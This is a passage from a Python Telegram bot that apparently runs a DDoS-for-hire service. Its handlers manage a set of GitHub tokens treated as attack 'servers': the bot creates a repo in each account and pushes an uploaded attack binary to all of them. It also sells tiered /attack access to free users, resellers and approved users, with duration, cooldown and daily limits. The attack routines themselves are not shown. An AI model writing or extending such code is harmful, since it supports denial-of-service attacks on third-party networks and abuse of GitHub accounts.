                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )
            del temp_data[user_id]
        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐍𝐔𝐌𝐁𝐄𝐑')}")

    elif step == "set_free_group_id":
        try:
            group_id = int(text.strip())
            free_settings["free_group_id"] = group_id
            save_free_settings(free_settings)
            
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ {bold('𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐍𝐞𝐰 𝐠𝐫𝐨𝐮𝐩 𝐈𝐃')}: {group_id}\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )
            del temp_data[user_id]
        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃')}\n{bold('𝐆𝐫𝐨𝐮𝐩 𝐈𝐃 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚 𝐧𝐮𝐦𝐛𝐞𝐫')}.")

    elif step == "set_private_link":
        link = text.strip()
        links_config['channels'][0]['invite_link'] = link
        save_links(links_config)
        
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ {bold('𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐋𝐈𝐍𝐊 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐍𝐞𝐰 𝐥𝐢𝐧𝐤')}: {link}\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
            reply_markup=reply_markup
        )
        del temp_data[user_id]

    elif step == "set_public_link":
        link = text.strip()
        links_config['channels'][1]['link'] = link
        save_links(links_config)
        
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ {bold('𝐏𝐔𝐁𝐋𝐈𝐂 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐋𝐈𝐍𝐊 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐍𝐞𝐰 𝐥𝐢𝐧𝐤')}: {link}\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
            reply_markup=reply_markup
        )
        del temp_data[user_id]

    elif step == "set_free_group_link":
        link = text.strip()
        links_config['free_group']['link'] = link
        save_links(links_config)
        
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ {bold('𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐍𝐊 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐍𝐞𝐰 𝐥𝐢𝐧𝐤')}: {link}\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
            reply_markup=reply_markup
        )
        del temp_data[user_id]

    elif step == "set_free_group_id_link":
        try:
            group_id = int(text.strip())
            links_config['free_group']['id'] = group_id
            save_links(links_config)
            
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ {bold('𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐍𝐞𝐰 𝐠𝐫𝐨𝐮𝐩 𝐈𝐃')}: {group_id}\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )
            del temp_data[user_id]
        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐆𝐑𝐎𝐔𝐏 𝐈𝐃')}")

    elif step == "token_add":
        token = text.strip()
        repo_name = "flamecrack-tg"

        try:
            for existing_token in github_tokens:
                if existing_token['token'] == token:
                    await update.message.reply_text(f"❌ {bold('𝐓𝐨𝐤𝐞𝐧 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐞𝐱𝐢𝐬𝐭𝐬')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
                    del temp_data[user_id]
                    return

            await update.message.reply_text(f"🔄 {bold('𝐀𝐃𝐃𝐈𝐍𝐆 𝐓𝐎𝐊𝐄𝐍')}...\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

            g = Github(token)
            user = g.get_user()
            username = user.login

            repo, created = create_repository(token, repo_name)

            new_token_data = {
                'token': token,
                'username': username,
                'repo': f"{username}/{repo_name}",
                'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'status': 'active'
            }
            github_tokens.append(new_token_data)
            save_github_tokens(github_tokens)

            binary_content = load_binary_file()
            binary_upload_status = ""
            if binary_content:
                success, status = upload_binary_to_repo(new_token_data, binary_content)
                if success:
                    binary_upload_status = f"\n✓ {bold('𝐁𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 𝐮𝐩𝐥𝐨𝐚𝐝𝐞𝐝')}: {status}"
                else:
                    binary_upload_status = f"\n⚠️ {bold('𝐁𝐢𝐧𝐚𝐫𝐲 𝐮𝐩𝐥𝐨𝐚𝐝 𝐟𝐚𝐢𝐥𝐞𝐝')}: {status}"
            else:
                binary_upload_status = f"\n⚠️ {bold('𝐍𝐨 𝐛𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 𝐟𝐨𝐮𝐧𝐝')}. {bold('𝐔𝐩𝐥𝐨𝐚𝐝 𝐨𝐧𝐞 𝐮𝐬𝐢𝐧𝐠')} '𝐔𝐩𝐥𝐨𝐚𝐝 𝐁𝐢𝐧𝐚𝐫𝐲' {bold('𝐛𝐮𝐭𝐭𝐨𝐧')}."

            reply_markup = get_main_keyboard(user_id)
            if created:
                message = (
                    f"✓ {bold('𝐍𝐄𝐖 𝐑𝐄𝐏𝐎 𝐂𝐑𝐄𝐀𝐓𝐄𝐃 & 𝐓𝐎𝐊𝐄𝐍 𝐀𝐃𝐃𝐄𝐃')}!\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 {bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: `{username}`\n"
                    f"📁 {bold('𝐑𝐞𝐩𝐨')}: `{repo_name}`\n"
                    f"📊 {bold('𝐓𝐨𝐭𝐚𝐥 𝐬𝐞𝐫𝐯𝐞𝐫𝐬')}: {len(github_tokens)}"
                    f"{binary_upload_status}\n\n"
                    f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                )
            else:
                message = (
                    f"✓ {bold('𝐓𝐎𝐊𝐄𝐍 𝐀𝐃𝐃𝐄𝐃 𝐓𝐎 𝐄𝐗𝐈𝐒𝐓𝐈𝐍𝐆 𝐑𝐄𝐏𝐎')}!\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 {bold('𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: `{username}`\n"
                    f"📁 {bold('𝐑𝐞𝐩𝐨')}: `{repo_name}`\n"
                    f"📊 {bold('𝐓𝐨𝐭𝐚𝐥 𝐬𝐞𝐫𝐯𝐞𝐫𝐬')}: {len(github_tokens)}"
                    f"{binary_upload_status}\n\n"
                    f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                )

            await update.message.reply_text(message, reply_markup=reply_markup)
            del temp_data[user_id]

        except Exception as e:
            await update.message.reply_text(f"❌ {bold('𝐄𝐑𝐑𝐎𝐑')}\n━━━━━━━━━━━━━━━━━━━━━━\n{str(e)}\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐭𝐡𝐞 𝐭𝐨𝐤𝐞𝐧')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
            del temp_data[user_id]

    elif step == "token_remove":
        try:
            token_num = int(text.strip())
            if token_num < 1 or token_num > len(github_tokens):
                await update.message.reply_text(f"❌ {bold('𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫')}. {bold('𝐔𝐬𝐞 𝟏-')}{len(github_tokens)}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
                del temp_data[user_id]
                return

            removed_token = github_tokens.pop(token_num - 1)
            save_github_tokens(github_tokens)

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✓ {bold('𝐒𝐄𝐑𝐕𝐄𝐑 𝐑𝐄𝐌𝐎𝐕𝐄𝐃')}!\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 {bold('𝐒𝐞𝐫𝐯𝐞𝐫')}: `{removed_token['username']}`\n"
                f"📁 {bold('𝐑𝐞𝐩𝐨')}: `{removed_token['repo']}`\n"
                f"📊 {bold('𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠')}: {len(github_tokens)}\n\n"
                f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text(f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐍𝐔𝐌𝐁𝐄𝐑')}\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    elif step == "broadcast_message":
        message = text
        del temp_data[user_id]
        await send_broadcast(update, context, message, user_id)

    elif step == "binary_upload":
        await update.message.reply_text(f"❌ {bold('𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐄𝐍𝐃 𝐀 𝐅𝐈𝐋𝐄')}\n{bold('𝐍𝐨𝐭 𝐭𝐞𝐱𝐭')}. {bold('𝐒𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐛𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

# ==================== BROADCAST FUNCTION ====================
async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message: str, user_id):
    """Send broadcast message to all users"""
    all_users = set()

    for uid in approved_users.keys():
        all_users.add(int(uid))

    for uid in resellers.keys():
        all_users.add(int(uid))

    for uid in admins.keys():
        all_users.add(int(uid))

    for uid in owners.keys():
        all_users.add(int(uid))
        
    for uid in user_server.keys():
        if user_server[uid] == "FREE":
            all_users.add(int(uid))

    total_users = len(all_users)
    success_count = 0
    fail_count = 0

    progress_msg = await update.message.reply_text(
        f"📢 {bold('𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓')}...\n"
        f"{bold('𝐓𝐨𝐭𝐚𝐥 𝐮𝐬𝐞𝐫𝐬')}: {total_users}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    for uid in all_users:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"📢 {bold('𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓')}\n━━━━━━━━━━━━━━━━━━━━━━\n{message}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
            )
            success_count += 1
            time.sleep(0.1)
        except:
            fail_count += 1

    reply_markup = get_main_keyboard(user_id)
    await progress_msg.edit_text(
        f"✓ {bold('𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• ✓ {bold('𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥')}: {success_count}\n"
        f"• ✗ {bold('𝐅𝐚𝐢𝐥𝐞𝐝')}: {fail_count}\n"
        f"• 📊 {bold('𝐓𝐨𝐭𝐚𝐥')}: {total_users}\n"
        f"• 📝 {bold('𝐌𝐞𝐬𝐬𝐚𝐠𝐞')}: {message[:50]}...\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )
    await update.message.reply_text(f"{bold('𝐔𝐬𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞')}:", reply_markup=reply_markup)

# ==================== BINARY FILE HANDLER ====================
async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle binary file upload"""
    user_id = update.effective_user.id

    if user_id not in temp_data or temp_data[user_id].get("step") != "binary_upload":
        return

    if not update.message.document:
        await update.message.reply_text(f"❌ {bold('𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐄𝐍𝐃 𝐀 𝐅𝐈𝐋𝐄')}\n{bold('𝐍𝐨𝐭 𝐭𝐞𝐱𝐭')}. {bold('𝐒𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐛𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    del temp_data[user_id]

    progress_msg = await update.message.reply_text(f"📥 {bold('𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐁𝐈𝐍𝐀𝐑𝐘 𝐅𝐈𝐋𝐄')}...\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)

        with open(file_path, 'rb') as f:
            binary_content = f.read()

        file_size = len(binary_content)

        save_binary_file(binary_content)

        await progress_msg.edit_text(
            f"📊 {bold('𝐅𝐈𝐋𝐄 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃')}: {file_size} {bold('𝐛𝐲𝐭𝐞𝐬')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📤 {bold('𝐔𝐩𝐥𝐨𝐚𝐝𝐢𝐧𝐠 𝐭𝐨 𝐚𝐥𝐥 𝐆𝐢𝐭𝐇𝐮𝐛 𝐫𝐞𝐩𝐨𝐬')}...\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )

        success_count = 0
        suspended_count = 0
        fail_count = 0
        results = []

        def upload_to_repo(token_data):
            try:
                status = check_token_status(token_data)
                if status == "suspended":
                    results.append((token_data['username'], False, "suspended"))
                else:
                    success, status_msg = upload_binary_to_repo(token_data, binary_content)
                    if success:
                        results.append((token_data['username'], True, "active"))
                    else:
                        results.append((token_data['username'], False, "failed"))
            except Exception as e:
                results.append((token_data['username'], False, str(e)))

        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        for username, success, status in results:
            if success:
                success_count += 1
            elif status == "suspended":
                suspended_count += 1
            else:
                fail_count += 1

        os.remove(file_path)

        reply_markup = get_main_keyboard(user_id)
        message = (
            f"✓ {bold('𝐁𝐈𝐍𝐀𝐑𝐘 𝐔𝐏𝐋𝐎𝐀𝐃 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃')}!\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 {bold('𝐑𝐞𝐬𝐮𝐥𝐭𝐬')}:\n"
            f"• ✓ {bold('𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥')}: {success_count}\n"
            f"• ⚠️ {bold('𝐒𝐮𝐬𝐩𝐞𝐧𝐝𝐞𝐝')}: {suspended_count}\n"
            f"• ✗ {bold('𝐅𝐚𝐢𝐥𝐞𝐝')}: {fail_count}\n"
            f"• 📊 {bold('𝐓𝐨𝐭𝐚𝐥')}: {len(github_tokens)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📁 {bold('𝐅𝐢𝐥𝐞')}: `{BINARY_FILE_NAME}`\n"
            f"📦 {bold('𝐅𝐢𝐥𝐞 𝐬𝐢𝐳𝐞')}: {file_size} {bold('𝐛𝐲𝐭𝐞𝐬')}\n"
            f"⚙️ {bold('𝐁𝐢𝐧𝐚𝐫𝐲 𝐫𝐞𝐚𝐝𝐲')}: ✓\n\n"
            f"ℹ️ {bold('𝐓𝐡𝐢𝐬 𝐛𝐢𝐧𝐚𝐫𝐲 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐚𝐮𝐭𝐨-𝐮𝐩𝐥𝐨𝐚𝐝𝐞𝐝 𝐭𝐨 𝐧𝐞𝐰 𝐭𝐨𝐤𝐞𝐧𝐬')}\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )

        await progress_msg.edit_text(message)
        await update.message.reply_text(f"{bold('𝐔𝐬𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞')}:", reply_markup=reply_markup)

    except Exception as e:
        await progress_msg.edit_text(f"❌ {bold('𝐄𝐑𝐑𝐎𝐑')}\n━━━━━━━━━━━━━━━━━━━━━━\n{str(e)}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

# ==================== ATTACK COMMAND HANDLER ====================
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command - Only works in free group for free users"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if is_free_user(user_id):
        if chat_id != free_settings["free_group_id"]:
            await update.message.reply_text(
                f"⛔ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐅𝐫𝐞𝐞 𝐮𝐬𝐞𝐫𝐬 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐧 𝐭𝐡𝐞 𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏')}\n\n"
                f"{bold('𝐉𝐨𝐢𝐧 𝐡𝐞𝐫𝐞')}:\n"
                f"{links_config['free_group']['link']}"
            )
            return
        
        await handle_free_attack(update, context)
    else:
        await launch_attack_start(update, context, user_id)

# ==================== MAIN FUNCTION ====================
def main():
    """Main function to run the bot"""
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_binary_file))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_press))

    print("🤖 " + bold("𝐓𝐇𝐄 𝐁𝐎𝐓 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆") + "...")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print(f"👑 {bold('𝐎𝐰𝐧𝐞𝐫 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}: {OWNER_USERNAME}")
    print(f"👑 {bold('𝐏𝐫𝐢𝐦𝐚𝐫𝐲 𝐨𝐰𝐧𝐞𝐫𝐬')}: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"👑 {bold('𝐒𝐞𝐜𝐨𝐧𝐝𝐚𝐫𝐲 𝐨𝐰𝐧𝐞𝐫𝐬')}: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
    print(f"📊 {bold('𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐮𝐬𝐞𝐫𝐬')}: {len(approved_users)}")
    print(f"💰 {bold('𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬')}: {len(resellers)}")
    print(f"🆓 {bold('𝐅𝐫𝐞𝐞 𝐮𝐬𝐞𝐫𝐬')}: {len([uid for uid in user_server if user_server[uid] == 'FREE'])}")
    print(f"🔑 {bold('𝐒𝐞𝐫𝐯𝐞𝐫𝐬')}: {len(github_tokens)}")
    print(f"🔧 {bold('𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞')}: {'𝐎𝐍' if MAINTENANCE_MODE else '𝐎𝐅𝐅'}")
    print(f"⏳ {bold('𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {COOLDOWN_DURATION}s")
    print(f"🆓 {bold('𝐅𝐫𝐞𝐞 𝐔𝐬𝐞𝐫 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬')}:")
    print(f"  ⏱️ {bold('𝐌𝐚𝐱 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}: {free_settings['max_duration']}s")
    print(f"  🔄 {bold('𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {free_settings['cooldown']}s")
    print(f"  📊 {bold('𝐌𝐚𝐱/𝐃𝐚𝐲')}: {free_settings['max_attacks_per_day']}")
    print(f"  💬 {bold('𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝')}: {'𝐘𝐞𝐬' if free_settings['feedback_required'] else '𝐍𝐨'}")
    print("━━━━━━━━━━━━━━━━━━━━━━")

    application.run_polling()

if __name__ == '__main__':
    main()